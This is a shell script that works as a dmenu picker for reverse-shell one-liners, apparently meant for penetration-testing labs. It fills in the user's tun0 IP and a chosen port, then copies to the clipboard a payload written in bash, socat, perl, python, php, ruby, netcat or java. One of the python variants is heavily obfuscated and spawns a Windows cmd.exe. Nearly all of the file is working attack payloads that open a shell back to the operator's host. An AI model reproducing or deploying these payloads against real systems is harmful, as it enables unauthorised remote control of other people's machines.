#!/bin/sh

# -- Just a dmenu wrapper --
# It just needs a port and a revshell type
# and u get a revshell with ur tun0 ip and
# the port u set
# Created by M4t35Z

# Inspired by: 
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# Needed variables
tun0_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet \K[\d.]+')
tun0_ipv6_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet6 \K[a-z0-9].+(?=(\/))')
port="$($1 | dmenu -p "Gimme a port u wanna listen on")"

# Replace vars if they are empty
case "" in
    $tun0_ip) tun0_ip="10.0.0.1" ;;
esac
case "" in
    $tun0_ipv6_ip) tun0_ipv6_ip="dead:beef:2::125c" ;;
esac
case "" in
    $port) port=1234 ;;
esac

# RevShell copypasta
## bash
bashtcp1_shell="bash -i >& /dev/tcp/$tun0_ip/$port 0>&1"
bashtcp2_shell="0<&196;exec 196<>/dev/tcp/$tun0_ip/$port; sh <&196 >&196 2>&196"
bashudp1_shell="sh -i >& /dev/udp/$tun0_ip/$port 0>&1"
## socat
socat1_shell="/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$tun0_ip:$port"
## perl
perllin1_shell="perl -e 'use Socket;\$i="\""$tun0_ip"\"";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("\""tcp"\""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"\"">&S"\"");open(STDOUT,"\"">&S"\"");open(STDERR,"\"">&S"\"");exec("\""/bin/sh -i"\"");};'"
perllin2_shell="perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,"\""$tun0_ip:$port"\"");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
perlwin1_shell="perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,"\""$tun0_ip:$port"\"");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
## python
pythonipv4lin1_shell="export RHOST="\""$tun0_ip"\"";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("\""RHOST"\""),int(os.getenv("\""RPORT"\""))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("\""/bin/sh"\"")'"
pythonipv4lin2_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("\""/bin/bash"\"")'"
pythonipv4lin3_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'"
pythonipv6lin1_shell="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("\""$tun0_ipv6_ip"\"",$port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("\""/bin/sh"\"");'"
pythonipv4win1_shell="python.exe -c "\""(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$tun0_ip', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"\"""
## php
phplin1_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin2_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);shell_exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin3_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);\`/bin/sh -i <&3 >&3 2>&3\`;'"
phplin4_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);system("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin5_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);passthru("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin6_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);popen("\""/bin/sh -i <&3 >&3 2>&3"\"", "\""r"\"");'"
phplin7_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);\$proc=proc_open("\""/bin/sh -i"\"", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
## ruby
rubylin1_shell="ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'"
rubylin2_shell="ruby -rsocket -e 'exit if fork;c=TCPSocket.new("\""$tun0_ip"\"","\""$port"\"");while(cmd=c.gets);IO.popen(cmd,"\""r"\""){|io|c.print io.read}end'"

# ---

# Texts
## bash
bashtcp1_text="bt1 -> $bashtcp1_shell"
bashtcp2_text="bt2 -> $bashtcp2_shell"
bashudp1_text="bu1 -> $bashudp1_shell"
## socat
socat1_text="sc1 (github.com/andrew-d/static-binaries) -> $socat1_shell"
## perl
perllin1_text="pll1 -> $perllin1_shell"
perllin2_text="pll2 -> $perllin2_shell"
perlwin1_text="plw1 -> $perlwin1_shell"
## python
pythonipv4lin1_text="py4l1 -> $pythonipv4lin1_shell"
pythonipv4lin2_text="py4l2 -> $pythonipv4lin2_shell"
pythonipv4lin3_text="py4l3 -> $pythonipv4lin3_shell"
pythonipv6lin1_text="py6l1 -> $pythonipv6lin1_shell"
pythonipv4win1_text="py4w1 -> $pythonipv4win1_shell"
## php
phplin1_text="ph1 (exec) -> $phplin1_shell"
phplin2_text="ph2 (shell_exec) -> $phplin2_shell"
phplin3_text="ph3 (\`sh\`) -> $phplin3_shell"
phplin4_text="ph4 (system) -> $phplin4_shell"
phplin5_text="ph5 (passthru) -> $phplin5_shell"
phplin6_text="ph6 (popen) -> $phplin6_shell"
phplin7_text="ph7 (proc_open) -> $phplin7_shell"
## ruby
rubylin1_text="rbl1 -> $rubylin1_shell"
rubylin2_text="rbl2 -> $rubylin2_shell"

# ---

# The Juicy part
case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\nnc(long)\\nnc(-e)\\npython\\nphp\\nperl\\nruby\\njava" | dmenu -l 15 -i -p "R3vSh3LLZ")" in

    ## bash
    "$bashtcp1_text") echo -n "$bashtcp1_shell" | xclip -selection clipboard ;;
    "$bashtcp2_text") echo -n "$bashtcp2_shell" | xclip -selection clipboard ;;
    "$bashudp1_text") echo -n "$bashudp1_shell" | xclip -selection clipboard ;;

    ## socat
    "$socat1_text") echo -n "$socat1_shell" | xclip -selection clipboard ;;

    ## perl
    "$perllin1_text") echo -n "$perllin1_shell" | xclip -selection clipboard ;;
    "$perllin2_text") echo -n "$perllin2_shell" | xclip -selection clipboard ;;
    "$perlwin1_text") echo -n "$perlwin1_shell" | xclip -selection clipboard ;;

    ## python
    "$pythonipv4lin1_text") echo -n "$pythonipv4lin1_shell" | xclip -selection clipboard ;;
    "$pythonipv4lin2_text") echo -n "$pythonipv4lin2_shell" | xclip -selection clipboard ;;
    "$pythonipv4lin3_text") echo -n "$pythonipv4lin3_shell" | xclip -selection clipboard ;;
    "$pythonipv6lin1_text") echo -n "$pythonipv6lin1_shell" | xclip -selection clipboard ;;
    "$pythonipv4win1_text") echo -n "$pythonipv4win1_shell" | xclip -selection clipboard ;;

    ## php
    "$phplin1_text") echo -n "$phplin1_shell" | xclip -selection clipboard ;;
    "$phplin2_text") echo -n "$phplin2_shell" | xclip -selection clipboard ;;
    "$phplin3_text") echo -n "$phplin3_shell" | xclip -selection clipboard ;;
    "$phplin4_text") echo -n "$phplin4_shell" | xclip -selection clipboard ;;
    "$phplin5_text") echo -n "$phplin5_shell" | xclip -selection clipboard ;;
    "$phplin6_text") echo -n "$phplin6_shell" | xclip -selection clipboard ;;
    "$phplin7_text") echo -n "$phplin7_shell" | xclip -selection clipboard ;;

    ## ruby(buggy(port) cuz dmenu doesnt like %d's xdd)
    "$rubylin1_text") echo -n "$rubylin1_shell" | xclip -selection clipboard ;;

    ## deprecated
    "nc(long)") echo -n \
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_ip $port >/tmp/f" \
        | xclip -selection clipboard ;;

    "nc(-e)") echo -n \
        "nc -e /bin/sh $tun0_ip $port" \
        | xclip -selection clipboard ;;

    "python") echo -n \
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'" \
        | xclip -selection clipboard ;;

    "php") echo -n \
        "php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'" \
        | xclip -selection clipboard ;;

    "perl") echo -n \
        "perl -e 'use Socket;\$i="\""$tun0_ip"\"";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("\""tcp"\""));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,"\"">&S"\"");open(STDOUT,"\"">&S"\"");open(STDERR,"\"">&S"\"");exec("\""/bin/sh -i"\"");};'" \
        | xclip -selection clipboard ;;

    "ruby") echo -n \
        "ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'" \
        | xclip -selection clipboard ;;

    "java") echo -n \
        "r = Runtime.getRuntime()\np = r.exec(["\""/bin/bash"\"","\""-c"\"","\""exec 5<>/dev/tcp/$tun0_ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"\""] as String[])\np.waitFor()" \
        | xclip -selection clipboard ;;
esac
